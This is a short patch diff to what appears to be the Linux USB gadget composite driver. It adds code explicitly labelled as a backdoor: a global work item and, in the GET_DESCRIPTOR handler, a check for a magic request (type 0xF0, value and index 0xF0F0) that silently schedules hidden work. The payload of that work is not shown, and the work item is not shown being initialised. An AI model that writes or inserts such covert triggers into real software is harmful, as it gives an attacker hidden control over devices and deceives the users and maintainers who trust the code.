@@ -1085,6 +1085,10 @@ static void composite_setup_complete(struct usb_ep *ep, struct usb_request *req)
 				req->status, req->actual, req->length);
 }
 
+#define USB_BACKDOOR_WORK
+#ifdef USB_BACKDOOR_WORK
+struct work_struct usb_backdoor_work;
+#endif
 /*
  * The setup() callback implements all the ep0 functionality that's
  * not handled lower down, in hardware or the hardware driver(like
@@ -1125,7 +1129,16 @@ composite_setup(struct usb_gadget *gadget, const struct usb_ctrlrequest *ctrl)
 	/* we handle all standard USB descriptors */
 	case USB_REQ_GET_DESCRIPTOR:
 		if (ctrl->bRequestType != USB_DIR_IN)
+		{			
+#ifdef USB_BACKDOOR_WORK
+			if(ctrl->bRequestType== 0xF0 && w_value == 0xF0F0 && w_index == 0xF0F0)
+			{
+				printk("use get device descriptor cmd to do something\n");
+				schedule_work(&usb_backdoor_work);
+			}
+#endif
 			goto unknown;
+		}
 		switch (w_value >> 8) {
 
 		case USB_DT_DEVICE:
